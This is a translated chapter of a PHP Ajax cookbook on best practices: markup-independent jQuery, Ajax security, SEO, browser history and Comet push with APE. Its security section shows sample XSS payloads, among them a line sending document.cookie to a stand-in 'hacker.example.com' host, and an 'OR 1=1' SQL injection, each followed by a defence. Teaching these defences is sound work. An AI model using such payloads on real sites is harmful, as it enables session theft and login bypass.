# PHP Ajax 秘籍（四）

> 原文：[`zh.annas-archive.org/md5/5ed725dded7917e2907901dccf658d88`](https://zh.annas-archive.org/md5/5ed725dded7917e2907901dccf658d88)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第七章：实施构建 Ajax 网站的最佳实践

在本章中，我们将涵盖：

+   避免 HTML 标记特定编码

+   构建安全的 Ajax 网站

+   构建搜索引擎优化（SEO）友好的 Ajax 网站

+   保留浏览器历史记录或修复浏览器的后退按钮

+   实施彗星 PHP 和 Ajax

完成一件事是一回事，正确完成一件事是另一回事。JavaScript 程序员经常追求最佳实践。随着 UI 编程的流行，它需要更好的组织和实践。在本章中，我们将看到一些常见的最佳实践。

# 避免 HTML 标记特定编码

在无侵入式 JavaScript 方法中，基于选择器的框架（如 jQuery）起着重要作用，HTML 内容与 JavaScript 之间的交互是通过 CSS 选择器完成的。

## 做好准备

假设我们有一个 ID 为`alert`的容器，我们的意图是隐藏它及其相邻元素-也就是隐藏其父元素的所有元素：

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html >
<head>
<script type="text/javascript" src="jquery.min.js">
</script>
<script type="text/javascript" src="markup-dependent.js">
</script>
<title>Markup dependent jQuery</title>
</head>
<body>
<div>
<a href="#" id="trigger">Hide alert's siblings</a>
</div>
<div id="alert-parent">
<div id="alert-sibling1">
Alert Sibling1
</div>
<div id="alert">
Alert
</div>
<div id="alert-sibling2">
Alert Sibling2
</div>
<div id="alert-sibling3">
Alert Sibling3
</div>
</div>
</body>
</html>
jQuery(document).ready(function($){
$('#trigger').click(function(){
$('#alert').parent().hide();
return false;
});
});

```

到目前为止，一切都很好。但是，从代码可维护性的角度来看，这种方法是错误的。

## 如何做...

在 Web 2.0 世界中，网站的设计必须定期更改，以给客户带来新鲜感，UI 设计师必须努力带来新鲜感和更好的可用性。对于前面的标记，让我们假设 UI 设计师在`alert`容器周围添加了额外的边框。CSS 程序员更容易的方法是将`alert`容器包装在另一个容器中以获得边框：

```php
<div id="border-of-alert">
<div id="alert">
Alert
</div>
</div>

```

现在，以前的 JavaScript 功能不像预期的那样工作。CSS 程序员无意中破坏了网站-即使他们能够在`alert`容器周围添加另一个边框。

这说明了 JavaScript 和 CSS 程序员之间协议和标准的必要性-这样他们就不会无意中破坏网站。这可以通过以下方式实现：

1.  通过命名约定引入协议

1.  以不同方式处理情况

## 它是如何工作的...

我们将看到命名约定和不同方法如何帮助我们在这里。

### 通过命名约定引入协议：

当 CSS 程序员更改 HTML 标记时，没有线索表明标记与 JavaScript 功能相关联。因此，命名约定和规则就出现了：

+   所有用于 Ajax 目的的选择器都应该以`js-`为前缀

+   每当标记与 JavaScript 功能相关联时，必须在 PHP 级别进行注释（因为 HTML 注释将暴露给最终用户）

请注意，在与 CSS 程序员达成共识后，我们可以引入更多这样的协议。根据我们引入的协议，HTML 标记将需要更改为：

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html >
<head>
<script type="text/javascript" src="jquery.min.js">
</script>
<script type="text/javascript" src="no-dependent.js">
</script>
<title>No dependent jQuery - Good</title>
</head>
<body>
<div>
<?php
/*
* Ajax note:
* When js-trigger is clicked, parent and siblings
* of js-alert will hide. "js-alert-parent" is referred
* in JavaScript
*/
?>
<a href="#" id="js-trigger">Hide alert's siblings</a>
</div>
<div id="js-alert-parent">
<div id="alert-sibling1">
Alert Sibling1
</div>
<div id="js-alert">
Alert
</div>
<div id="alert-sibling2">
Alert Sibling2
</div>
<div id="alert-sibling3">
Alert Sibling3
</div>
</div>
</body>
</html>

```

### 处理问题陈述：

如果我们直接引用父元素而不是通过`alert`容器的父元素来隐藏元素，问题的可能性就会降低：

```php
jQuery(document).ready(function($){
$('#js-trigger').click(function(){
$('#js-alert-parent').hide();
return false;
});
});

```

请注意，在这里，我们没有使用`parent()`方法。换句话说，如果我们可以避免`parent()`和`children()`方法对特定标记的使用，我们就相对不太容易使网站崩溃。

## 还有更多...

一般来说，通过代码搜索很容易找到`parent()`和`children()`的用法。但是，如果使用是从未知位置触发的，我们可以修改 jQuery 代码以在 Firebug 控制台中抛出通知。

### console.warn()

为了警告开发人员不要使用它，我们可以查看 jQuery 核心的`parent()`方法，并通过 Firebug 的控制台 API 添加警告：

```php
console.warn('Call to parent(). Warning: It may break when HTML code changes');

```

同样地，我们可以在`children()`方法中添加一个警告：

```php
console.warn('Call to children(). Warning: It may break when HTML code changes');

```

# 构建安全的 Ajax 网站

Ajax 本身并不会产生任何安全风险，但是将网站变成 Ajax 化的方法可能会带来安全风险。这些风险对所有 Web 应用程序都是普遍的。

## 做好准备

我们需要一个安装了开发人员工具的 Web 浏览器。此目的可能的工具包括带有 Firebug 的 Firefox。

## 如何做...

在 Ajax 或非 Ajax 基于 Web 的应用程序中一些常见的安全威胁包括 XSS、SQL 注入和会话劫持。我们将看到它们如何被防止。

1.  **XSS**

XSS 或跨站脚本攻击利用了通过用户输入或某种方式通过 URL 进行网站脚本添加的能力。让我们以允许用户输入其个人简介的流行 Twitter 网站为例。考虑以下输入**Bio**字段：

```php
<script>alert('XSS');</script>

```

如果 Twitter 工程师允许 HTML 执行，或者在显示它们之前没有对条目进行净化，它将提示一个带有文本**XSS**的警报框。在现实世界的情况下，它不会是一个警报框，而可能是恶意活动，比如通过已知 URL 模仿用户输入或窃取用户数据或劫持会话：

```php
ajaxReq('http://example.com/updateUser.php?passwd=xyz');

```

通常，黑客可能无法直接访问`updateUser.php`页面；但是 JavaScript 代码可以完全访问，因为它在当前会话范围内。因此，在这里，我们还必须看看我们的架构：

```php
document.write('<img src= "http://hacker.example.com/storeHackedData.php?' + document.cookie + '" />';

```

有了执行这个恶意代码的能力，黑客可能开始窃取浏览器 cookie。通过 cookie 中的会话 ID，黑客可能劫持用户的会话。

**解决方案：**

XSS 的可能解决方案包括：

+   `strip_tags()`

但是，当我们必须显示 HTML 输入时，这可能不是一个好的解决方案。

+   HTML 净化器库[`htmlpurifier.org/`](http://htmlpurifier.org/)

这个库可以净化 HTML 代码，因此对于 XSS 问题是一个更好的选择。

1.  **会话劫持**

如前所述，黑客可能窃取 cookie 数据，从而获取用户的会话 ID。当黑客通过 cookie 编辑工具设置其浏览器的会话值时，黑客将获得对其他用户会话的访问权限。当服务器或脚本被编程为对所有通信使用相同的会话 ID 时，这种威胁通常很常见。

**解决方案：**

一个可能的快速解决方案是为每个请求生成一个新的会话 ID：

`session_regenerate_id()`

1.  **SQL 注入**

当 SQL 查询根据用户输入来获取一些结果，并且如果用户输入没有得到适当的净化，它就会打开改变 SQL 查询的可能性。例如：

```php
$sql = 'SELECT COUNT(*) FROM users WHERE username=\''.$_POST['username'].'\' AND passwd=\''.$_POST['passwd'].'\'';

```

先前的代码是一个新手的代码，用于验证用户名和密码组合的登录。当发生以下情况时，这种方法会失败得很惨：

```php
$_POST['username'] = 'anything'
$_POST['passwd'] = "anything' OR 1=1"

```

由于`OR 1=1`注入而扩展查询为真：

```php
SELECT COUNT(*) FROM users WHERE username='anything' AND passwd='anything' OR 1=1'

```

**解决方案：**

SQL 注入的唯一防弹解决方案是使用`mysqli`扩展和 PDO 包中提供的准备好的语句：

```php
$sql = 'SELECT COUNT(*) FROM users WHERE username=:username AND passwd=:passwd';
$sth = $dbh->prepare($sql);
$sth->bindParam(':username', $_POST['username'], PDO::PARAM_STR);
$sth->bindParam(':passwd', $_POST['passwd'], PDO::PARAM_STR);
$sth->execute();
$count = $sth->fetchColumn();

```

此外，我们绝不能以明文形式存储密码——我们必须只在数据库中存储加盐哈希。这样，当攻击者以某种方式获得对数据库的访问权限时，我们可以避免密码以明文形式暴露给攻击者。以前，开发人员使用 MD5，然后是 SHA-512 哈希函数，但现在只推荐 bcrypt。这是因为，与其他哈希算法相比，使用 bcrypt 需要更多的时间来破解原始密码。

### Ajax 应用程序的常见错误

**仅客户端决策：**

仅客户端验证、数据绑定和决策是 Ajax 应用程序的常见错误。

仅客户端验证可以很容易地通过禁用 JavaScript 或通过 cURL 直接请求攻击 URL 来破坏。

在购物车中，优惠券的折扣或优惠券验证必须在服务器端完成。例如，如果购物车页面提供优惠券代码的折扣，优惠券代码的有效性必须在服务器端决定。在客户端 JavaScript 中检查优惠券代码的模式是一个不好的方法——用户可以通过查看 JavaScript 代码找出优惠券代码的模式并生成任意数量的优惠券！同样，要支付的最终金额必须在服务器端决定。在下订单时，将最终应付金额保留在隐藏的表单字段或只读输入字段中而不验证应付金额和已付金额是一个不好的方法。很容易通过浏览器扩展（如 Firebug 和 Web Developer 扩展）更改任何表单字段——无论是隐藏的还是只读的。

**解决方案：**

解决方案是始终在服务器端决定而不是在客户端。请记住，即使是包装在 JavaScript 中的任何东西——甚至是神秘的逻辑——也已经暴露给了世界。

**代码架构问题：**

糟糕的架构代码和逻辑不良的代码是一个很大的风险。它们经常暴露意外的数据。

让我们看`http://example.com/user.php?field=email&id=2`。这个脚本被编写来返回用户表中给定`id`的`field`参数引用的值。这个代码架构的意外攻击是能够通过例如`http://example.com/user.php?field=passwd&id=2`来暴露任何字段，包括密码和其他敏感数据。

其他这样的数据暴露可能性是通过 Web 2.0 网站中常见的 Web 服务产生的。当对数据访问没有限制时，用户可以通过 Web 服务窃取数据，即使他们无法在主要网站上访问它。Web 服务通常以 JSON 或 XML 的形式暴露数据，这使得黑客可以轻松地进行窃取。

**解决方案：**

这些问题的解决方案是：

+   **白名单和黑名单请求：**

通过维护一个可以允许或拒绝的请求列表，可以最小化攻击。

+   **请求的限制：**

请求可以通过访问令牌进行速率限制，这样黑客就无法获取更多的数据。

+   **从一开始改进代码架构：**

当架构和框架从一开始就计划针对 Ajax 和 Web 2.0 时，这些问题可以被最小化。显然，每种架构都可能有自己的问题。

## 它是如何工作的...

XSS 是在其他用户查看页面时执行 JavaScript 代码的能力。通过这种方式，攻击者可以执行/触发意外的 URL。此外，攻击者可以窃取会话 cookie 并将其发送到自己的网页。一旦会话 cookie 在攻击者的网页上可用，他或她就可以使用它来劫持会话——而无需知道其他用户的登录详细信息。当 SQL 语句没有得到适当的转义时，原始的预期语句可以通过表单输入进行更改；这被称为 SQL 注入。

以下表格显示了 Web 浏览器在处理从[`www.example.com/page.html`](http://www.example.com/page.html)到不同 URL 的 Ajax 请求时遵循的同源策略：

| URL | 访问 |
| --- | --- |
| `http://subdomain.example.com/page.htm` | 不允许。不同的主机 |
| `http://example.com/page.html` | 不允许。不同的主机 |
| `http://www.example.com:8080/page.html` | 不允许。不同的端口 |
| `"http://www.example.com/dir/page.html"` | 允许。相同的域，协议和端口 |
| `https://www.example.com/page.html` | 不允许。不同的协议 |

在 Web 浏览器中严格遵循政策以避免 Ajax 中的任何直接安全风险。其他可能的安全风险对所有基于 Web 的应用程序都是普遍的，并源于常见的错误。通过适当的安全审计，我们可以避免进一步的风险。

## 还有更多...

通常，通过自动化审核工具来避免安全风险比手动代码检查更容易。有一些开源工具可用于减轻安全问题。

### Exploit-Me

Exploit-Me，网址为[`labs.securitycompass.com/index.php/exploit-me/`](http://labs.securitycompass.com/index.php/exploit-me/)，是一套用于测试 XSS、SQL 注入和访问漏洞的安全相关 Firefox 扩展。这是一种快速审核网站的强大的开源方法。

### WebInspect

HP 的 WebInspect 网络安全审核工具是一种企业审核工具，可扫描许多漏洞和安全向量。网址为[`www.fortify.com/products/web_inspect.html`](http://https://www.fortify.com/products/web_inspect.html)。

### 资源

有一些专门致力于 PHP 安全的网站和工具：

+   PHP 安全联盟，网址为[`phpsec.org/`](http://phpsec.org/)，提供与安全相关的信息。

+   Hardened-PHP 项目的 Suhosin，网址为[`www.hardened-php.org/suhosin/`](http://www.hardened-php.org/suhosin/)，提供了一个补丁，用于修补正常 PHP 构建中可能存在的常见安全漏洞。

+   `mod_security` Apache 模块，网址为[`www.modsecurity.org/`](http://www.modsecurity.org/)，可以保护服务器免受常见的安全攻击。

# 构建 SEO 友好的 Ajax 网站

在互联网上，网站及其商业模式大多依赖于搜索引擎。例如，当用户在 Google 搜索引擎中搜索关键词“图书出版”时，如果 Packt 的网站出现在结果的第一页，这对 Packt 来说将是一个优势，特别是当其商业模式依赖于互联网用户时。

搜索引擎，如谷歌，根据一些因素（称为算法）对结果页面进行排序。这些因素包括页面上的关键词密度、页面的受信任的内部链接、网站的流行度等。所有这些都取决于搜索引擎的蜘蛛能够爬取（或到达）网站的内容的程度。如果网站的索引页面没有链接到网站的内部页面，对内部页面有限制访问，或者没有通过搜索引擎蜘蛛在爬取时查找的`sitemap.xml`文件暴露内部页面，那么这些内容将不会被索引，也无法被搜索到。

依赖搜索引擎结果进行其商业模式的 Web 2.0 网站面临的挑战是，它们必须采用现代的 Ajax 方法来提高最终用户的可用性和留存率，但也需要具有可以被搜索引擎蜘蛛访问和爬取的内容。这就是 Ajax 和 SEO 的作用。

## 准备就绪

我们需要通过一种不显眼的 JavaScript 方法来逐步增强开发搜索引擎友好的网站。下面将解释这种方法和术语。

## 如何做…

采用 SEO 友好的 Ajax 的更容易的方法是逐步增强。这使得页面对任何人都可以访问，包括那些不使用浏览器中的 JavaScript 引擎的人。

为了理解这个概念，让我们来看一个案例，我们有一个带有标签的 Ajax UI，标签是从不同的远程页面加载的：

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html >
<head>
<script type="text/javascript" src="jquery.min.js">
</script>
<script type="text/javascript" src="script.js">
</script>
<title>Tab - without SEO friendliness</title>
</head>
<body>
<div id="tabs">
<ul>
<li><a id="t1" href="#">Tab 1</a></li>
<li><a id="t2" href="#">Tab 2</a></li>
<li><a id="t3" href="#">Tab 3</a></li>
<li><a id="t4" href="#">Tab 4</a></li>
</ul>
<div id="tab-1">
<p>Tab - 1</p>
</div>
<div id="tab-2">
<p>Tab - 2</p>
</div>
<div id="tab-3">
<p>Tab - 3</p>
</div>
<div id="tab-4">
<p>Tab - 4</p>
</div>
</div>
</body>
</html>
jQuery(document).ready(function($){
$('#t1, #t2, #t3, #t4').click(function(){
//extract the clicked element id's number
// as we have single handler for all ids
id=this.id.match(/\d/);
//load respective tab container with
// respective page like /page3.html
$('#tab-'+id).load('/page'+id+'.html');
return false;
});
});

```

如前所述，每个标签页的内容都是从`page1.html、page2.html`等加载的。但是，在检查 HTML 源代码时，无法知道内容加载的 URL；这些 URL 是在 JavaScript 代码中形成的，并且内容是动态加载的。由于大多数搜索引擎爬虫不支持 JavaScript 引擎，并且至少目前无法支持它，它们将错过内容。只有当爬虫可以“查看”内容时，它才能被搜索到。

因此，对于正确的搜索引擎和 SEO 友好性，我们有以下方法：

+   隐匿：

这是通过嗅探用户代理向搜索引擎蜘蛛呈现不同内容的术语。但是，谷歌等搜索引擎会禁止对其内容进行隐匿的网站，以提高搜索引擎质量。

+   `Sitemap.xml:`

在 `Sitemap.xml` 中为所有内部链接提供链接可能会提高搜索引擎的可访问性。`Sitemap.xml` 是向谷歌公开站点链接的标准。但是，这还不够，并且不应该意外地与隐匿混合在一起。

+   内联选项卡：

通过将所有内容倾倒在单个入口页面并使用隐藏和显示，我们可以改善搜索引擎的可访问性。但是，从搜索引擎优化的角度来看，这种解决方案失败了，因为搜索引擎蜘蛛找不到足够的页面。

+   渐进增强：

这是一种网站将被所有浏览器访问的方法。Ajax 增强不会影响非 JavaScript 浏览器的可见性/可访问性。到目前为止，这是最好的方法，当与 `Sitemap.xml` 结合使用时，可以提供更好的搜索引擎可见性。

现在，让我们看看渐进增强方法如何实现选项卡系统。为此，我们将使用 jQuery UI 的选项卡库：

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html >
<head>
<link rel="stylesheet" href="http://jquery-ui.css" type="text/css" media="all" />
<link rel="stylesheet" href="ui.theme.css" type="text/css" media="all" />
<script type="text/javascript" src="jquery.min.js">
</script>
<script type="text/javascript" src="jquery-ui.min.js">
</script>
<script type="text/javascript" src="script.js">
</script>
<title>Tab - with SEO friendliness</title>
</head>
<body>
<div id="tabs">
<ul>
<li><a href="page1.html">Tab 1</a></li>
<li><a href="page2.html">Tab 2</a></li>
<li><a href="page3.html">Tab 3</a></li>
<li><a href="page4.html">Tab 4</a></li>
</ul>
</div>
</body>
</html>
jQuery(document).ready(function($){
$('#tabs').tabs();
});

```

## 工作原理...

正如之前所指出的，我们并没有隐藏链接，它们始终是可访问的。当 JavaScript 未启用时，单击链接将带您到单独的页面。这就是搜索引擎“查看”网站的方式。搜索引擎将索引具有单独 URL 的页面，例如 `http://example.com/page1.html, http://example.com/page2.html` 等等。

### 注意

Hijax，简单来说，意味着 Hijack + Ajax。这是一种渐进增强技术，其中普通链接被“劫持”，并应用了 Ajax 效果，使网站具有 Ajax 化的感觉。

启用 JavaScript 时，jQuery UI 选项卡会被挂钩；它应用 Hijax 方法，并将链接转换为漂亮的选项卡界面。它还将选项卡链接 Ajax 化，从而在用户单击选项卡时避免页面刷新。

有关 jQuery UI 选项卡的更多信息，请参阅 第三章 中的 *创建选项卡导航* 配方，*使用 jQuery 的有用工具*。

### 谷歌的建议

目前，先前的退化 Ajax 方法是搜索引擎友好的 Ajax 的广泛接受的做法。但是，需要注意的一点是，当用户搜索 `page2.html` 的内容时，搜索引擎将显示链接为 `http://example.com/page2.html`。对于启用 JavaScript 的浏览器和具有 Ajax 经验的普通用户来说，这样的直接链接不会被暴露。因此，为了所有用户都有一致的 URL，谷歌提出了一个解决方案。这种技术，现在被称为 **hashbang**，要求所有 Ajax URL 哈希都以 `!` 为前缀，并提供访问 Ajax 页面内容的机制，如下所示：

+   `http://example.com/index.html#page1` 必须更改为 `http://example.com/index.html#!page1`。

+   当谷歌识别到类似 `http://example.com/index.html#!page1` 的 Ajax URL 时，它将爬取 `http://example.com/index.html?_escaped_fragment_=page1`。这个 URL 必须提供 Ajax 内容。

+   当谷歌在搜索结果页面中列出 URL 时，它将显示 Ajax URL `http://example.com/index.html#!page1`。

通过这种方式，所有用户都可以使用相同的 URL 访问网站。

# 保留浏览器历史或修复浏览器的返回按钮

![保留浏览器历史或修复浏览器的返回按钮](https://github.com/OpenDocCN/freelearn-php-zh/raw/master/docs/php-ajax-cb/img/3081_07_01.jpg)

根据基本概念，Ajax 允许用户在不刷新整个浏览器的情况下查看页面。随后的浏览器调用通过 XHR 请求路由，并将结果推送到浏览器窗口。在这种情况下，从用户的角度来看，有两个主要的可用性问题：首先，特定内容无法被书签标记 - 因为我们只有一个 URL，可以从中浏览后续页面而不刷新浏览器；其次，用户无法单击返回按钮返回以前的内容 - 因为页面状态在浏览器中没有改变。

## 准备工作

我们需要一个带有 Ajax 组件的浏览器来测试功能，以及一个支持 `window.onhashchange` 事件和 HTML5 的 `window.history.pushState()` 方法来进行比较。

## 如何做...

有许多 jQuery 插件可用于解决此问题。由 Benjamin Arthur Lupton 开发的 jQuery History 插件，可在[`www.balupton.com/projects/jquery-history`](http://www.balupton.com/projects/jquery-history)上获得，通过所有新方法处理历史机制，并为旧版浏览器提供了一个 hack。

考虑以下 HTML 片段，其中包含指向子页面的链接：

```php
<ul>
<li><a href="#/about">About site</a></li>
<li><a href="#/help">Help page</a></li>
</ul>

```

以下是通过 jQuery History 插件处理状态的片段：

```php
jQuery(document).ready(function($){
// bind a handler for all hash/state changes
$.History.bind(function(state){
alert('Current state: ' + state);
});
// bind a handler for state: about
$.History.bind('/about', function(state){
// update UI changes...
});
// Bind a handler for state: help
$.History.bind('/help', function(state){
// update UI changes...
});
});

```

该插件提供其他方法来手动更改状态，并触发状态处理程序。

```php
 $('#about').click(function(){
$.History.go('/about');
});

```

请注意，当用户点击链接`"#/about"`时，状态将更改为`/about`。但是，如果我们希望以编程方式更改状态，例如当用户点击`div`而不是`anchor`时，如前所示，可以使用`go()`方法。

当状态不应对用户可见，但我们需要触发状态处理程序时，`trigger()`方法很有用：

```php
$.History.trigger('/about');

```

## 它是如何工作的...

正如我们所指出的，浏览器不保存 Ajax 请求的状态，因此，后退按钮，浏览器历史记录和书签通常不起作用。一个诱人的快速解决方法是使用以下 JavaScript 代码来更改浏览器中的 URL：

```php
window.location.href = 'new URL';

```

这段代码的问题是它会重新加载浏览器窗口，因此会破坏 Ajax 的目的。

**更简单的 pushState()方法：**

在支持 HTML5 规范的浏览器中，我们可以使用

+   `window.history.pushState()`

+   `window.history.replaceState()`

+   `window.onpopstate`

`window.history.pushState()`允许我们更改浏览器中的 URL，但不会让浏览器重新加载页面。该函数接受三个参数：状态对象，标题和 URL。

```php
window.history.pushState({anything: 'for state'}, 'title', 'page.html');

```

我们还有`window.history.replaceState()`，它将类似于`pushState()`工作，但不会添加新的历史记录条目，它将替换当前 URL。

`window.onpopstate`事件在每次状态更改时触发，即当用户点击后退和前进按钮时。页面重新加载后，`popstate`事件将停止为页面重新加载之前保留的上一个状态触发。为了访问这些状态，我们可以使用`window.history.state`，它可以访问页面重新加载之前的状态。

以下片段显示了如何将这些方法组合在一起以快速解决浏览器历史记录问题：

```php
function handleAjax(responseObj,url){
document.getElementById('content').innerHTML = responseObj.html;
document.title=responseObj.pageTitle;
window.history.pushState({
html:responseObj.html,
pageTitle:responseObj.pageTitle
}, '', url);
}
window.onpopstate=function(e){
if (e.state){
document.getElementById('content').innerHTML = e.state.html;
document.title = e.state.pageTitle;
}
};

```

**onhashchange 方法：**

解决浏览器历史记录问题的主要方法是通过看起来像`#foo`的 URL 哈希。使用哈希的主要动机是，通过`location.hash`更改它不会刷新页面（不像`location.href`），并且对于某些浏览器还会在浏览器历史记录中添加一个条目。但是，当用户点击后退或前进按钮时，没有简单的机制来查看 URL 哈希是否已更改。`window.onhashchange`事件已经在较新的浏览器中引入，并且在哈希更改时将被执行。

`hashchange`事件的可移植性 hack 是通过`setInterval()`方法不断轮询哈希更改。轮询间隔越短，响应性越好，但使用太短的值会影响性能。

**iframe hack 方法：**

一些浏览器，特别是 IE6，在哈希更改时不保存状态。因此，在这里，解决方法是创建一个不可见的`iframe`元素，并更改其`src`属性以跟踪状态。这是因为浏览器跟踪`iframe src`更改的状态。因此，当用户点击浏览器的后退或前进按钮时，他们必须轮询`iframe`的`src`属性以更新 UI。

**结合所有方法：**

为了更好的浏览器兼容性和性能，将所有先前的方法结合起来是至关重要的。jQuery History 插件抽象了所有这些方法，并提供了更好的功能。

# 实现彗星 PHP 和 Ajax

在传统的客户端-服务器通过 HTTP 通信中，对于服务器的每个响应，客户端都会发出请求。换句话说，没有请求就没有响应。

![实现彗星 PHP 和 Ajax](https://github.com/OpenDocCN/freelearn-php-zh/raw/master/docs/php-ajax-cb/img/3081_07_02.jpg)

Comet、Ajax Push、Reverse Ajax、双向 Web、HTTP 流或 HTTP 服务器推送是用来指代从服务器推送即时数据更改的实现的集体术语。与传统通信不同，在这里，客户端的请求只需一次，所有数据/响应都是从服务器推送的，而不需要客户端进一步的请求调用。

![实现彗星 PHP 和 Ajax](https://github.com/OpenDocCN/freelearn-php-zh/raw/master/docs/php-ajax-cb/img/3081_07_03.jpg)

通过彗星，我们可以创建 Ajax 聊天和其他实时应用程序。在 HTML5 的 WebSocket API 引入之前，JavaScript 开发人员不得不使用`iframe`、长轮询 Ajax 等方法进行黑客攻击

有许多可用的彗星技术，包括在 Apache Web 服务器上的纯 JavaScript 方法。但是，在性能和方法方面，开源的 APE（Ajax Push Engine）技术看起来很有前途。APE 有两个组件：

1.  APE 服务器

1.  APE JSF（APE JavaScript 框架）

服务器是用 C 编写的，JavaScript 框架基于 Mootools，但也可以与其他框架一起使用，如 jQuery。 APE 服务器模块可以通过 JavaScript 代码进行扩展。它支持传输方法，如长轮询、XHR 流、JSONP 和服务器发送事件。APE 服务器的一些优点包括：

+   基于 Apache 的解决方案无法进行真正的推送

+   APE 可以处理超过 100,000 个用户

+   APE 比基于 Apache 的彗星解决方案更快

+   APE 节省了大量带宽

+   APE 提供的选项比简单的彗星解决方案更多

## 准备就绪

我们的彗星实验需要一个 APE 服务器。建议在 Linux 上安装 APE 服务器，尽管它也可以在带有 VirutalBox 的 Windows 机器上运行。它可以从[`www.ape-project.org/`](http://www.ape-project.org/)下载。

我们将不得不在`Build/uncompressed/apeClientJS.js`中配置 APE 客户端脚本的服务器设置：

```php
//URL for APE JSF...
APE.Config.baseUrl = 'http://example.com/APE_JSF/';
APE.Config.domain = 'auto';
//where APE server is installed...
APE.Config.server = 'ape.example.com';

```

## 如何做...

我们将看到如何进行简单的彗星客户端-服务器交互。我们还将看到如何使用 APE 服务器来通过彗星设置向客户端广播消息。在设置彗星之前，我们需要一些基本的 APE 术语理解。

+   **管道：**

管道是客户端和服务器之间交换数据的通信管道，是通信系统的核心。有两种主要类型的管道：

+   多管道或频道

+   Uni 管道或用户

管道由服务器生成的名为 pubid 的 32 个字符的唯一 ID 标识。

+   **频道：**

频道是可以由服务器或用户直接创建的通信管道。如果用户订阅不存在的频道，则会自动创建频道。每个频道都有一系列属性，并且有两种工作方式：

+   交互式频道

+   非交互式频道

订阅现有交互式频道的用户将收到所有其他订阅该频道的用户列表，并可以通过频道管道直接与它们进行通信。在非交互式频道中，通信是只读的，用户不互相认识，也不能通过频道进行通信。可以通过在频道名称前加上*字符来启动非交互式频道的创建。

+   **用户：**

当用户连接到 APE 时，将为与其他实体进行通信创建一个管道，并为管道分配一个唯一的 sessid。该 ID 帮助服务器识别发送每个命令的用户。用户可以执行允许他们：

+   在管道上为频道或其他用户发布消息

+   订阅/加入频道

+   取消订阅/离开频道

+   创建频道

现在，代码：

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html >
<head>
<script type="text/javascript" src="Build/uncompressed/apeClientJS.js">
</script>
<title>Comet with APE</title>
</head>
<body>
<script type="text/javaScript">
var client = new APE.Client();
//Load APE Core
client.load();
//callback, fired when the Core is loaded and ready
// to connect to APE Server
client.addEvent('load', function(){
//Call start function to connect to APE Server
client.core.start({
'name':prompt('Your name?')
});
});
//wrap rest of the code in ready event
client.addEvent('ready', function(){
alert('Client is connected with APE Server');
//join 'myChannel'. If it doesn't exist,
// it will be created
client.core.join('myChannel');
//when channel is created or
// user has joined existing channel...
client.addEvent('multiPipeCreate', function(pipe, options){
//send the message on the pipe
//other users in myChannel can view this message
pipe.send('Test message on myChannel');
alert('Test message sent on myChannel');
});
// on receipt of new message...
client.onRaw('data', function(raw,pipe){
alert('Receiving : '+unescape(raw.data.msg));
});
});
</script>
</body>
</html>

```

上述代码将客户端与服务器连接，并将用户加入名为`myChannel`的频道。当用户加入频道时，它会向频道`myChannel`上的其他用户发送测试消息。请注意，消息是通过频道名称共享的。

为了从服务器端推送一些消息，APE 提供了一种称为`inlinepush`的机制。这个`inlinepush`可以通过调用 APE 服务器的 URL 来触发：

```php
<?php
$APEserver = 'http://ape.example.com/?';
$APEPassword = 'mypassword';
$cmd = array(array(
'cmd' => 'inlinepush',
'params' => array(
'password' => $APEPassword,
'raw' => 'postmsg',
'channel' => 'myChannel',
'data' => array(
'message' => 'My message from PHP'
)
)
));
//trigger request via curl or file_get_contents()...
// request params are in JSON
$data = file_get_contents($APEserver.rawurlencode(json_encode($cmd)));
$data = json_decode($data); // JSON response
if ($data[0]->data->value == 'ok') {
echo 'Message sent!';
} else {
echo 'Error, server response:'. $data;
}
?>

```

## 它是如何工作的...

APE 的底层协议使用 JSON 进行数据传输。从客户端到服务器的连接是通过 APE 的`start()`方法来初始化的。加入频道或创建新频道是通过`join()`方法来初始化的。然后通过`send()`方法将消息传递给频道上其他用户。应该打开多个浏览器窗口或标签页，以查看从一个窗口传输到其他窗口的消息。

APE 的`inlinepush`机制提供了一种在不使用客户端的情况下向频道用户推送消息的方式。这样的推送可以通过调用带有命令的 JSON 编码的 URL 来启动。从 PHP，这样的 URL 可以通过 cURL 调用或简单的`file_get_contents()`调用来触发。


# 第八章：Ajax 混搭

在本章中，我们将涵盖以下主题：

+   网络服务

+   XML-RPC

+   使用 PHP 创建和使用网络服务

+   使用 Flickr API 与 Ajax

+   使用 Twitter API 与 Ajax

+   使用 Google Ajax API 翻译文本

+   使用 Google 地图

+   在 Google 地图中搜索位置

+   在 Google 地图上搜索 XX 公里半径内的位置，带有标记和信息窗口

+   带标记和信息窗口的地图

+   使用 IP 地址查找城市/国家

+   使用 Ajax 和 PHP 转换货币

如今，对网络服务的了解是 Web 开发人员的重要素质之一。在本章中，我们首先介绍了如何使用流行网站提供的网络服务。

首先，我们将学习 SOAP、REST 和 XML-RPC 等流行网络服务格式的介绍。在该部分之后，我们将学习如何与各种流行的 Web 应用程序的 API 进行交互，如 Flickr、Twitter、Google 翻译、Google 地图和使用 foxrate.org 的 XML-RPC API 的货币转换器。

# 网络服务

在典型的基于 Web 的应用程序中，Web 客户端（通常是浏览器）向 Web 服务器发送 HTTP 请求，Web 服务器通过 HTTP 协议将响应发送给客户端。

例如，假设您想获取特定城市的天气报告。在这种情况下，您可以访问新闻门户网站，并通过 HTML 搜索您城市的天气报告。

但是，网络服务的工作方式不同。与上面提到的通过 HTML 页面访问信息不同，网络服务会导致服务器公开应用程序逻辑，客户端可以以编程方式使用。简单来说，这意味着服务器公开了一组客户端可以调用的 API（即函数）。因此，网络服务是服务器上公开的应用程序，客户端可以通过互联网访问。

